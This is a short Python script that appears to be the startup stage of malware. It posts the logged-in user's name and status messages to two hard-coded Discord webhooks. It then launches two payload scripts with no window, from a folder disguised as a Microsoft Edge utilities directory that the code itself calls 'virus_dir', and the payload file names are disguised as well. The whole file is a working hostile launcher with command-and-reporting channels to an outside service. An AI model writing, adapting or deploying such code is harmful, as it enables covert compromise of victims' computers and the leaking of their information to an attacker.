import subprocess, sys, os, requests

def log_to_discord(msg:str, important=False):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
        if important:
            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
    except:
        print("Failed to send port request")

log_to_discord("**Started startup file**", important=True)

home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']

virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)

subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleaner_x32.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is file_checker.py
subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleanup_x64.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is gama_aaa.py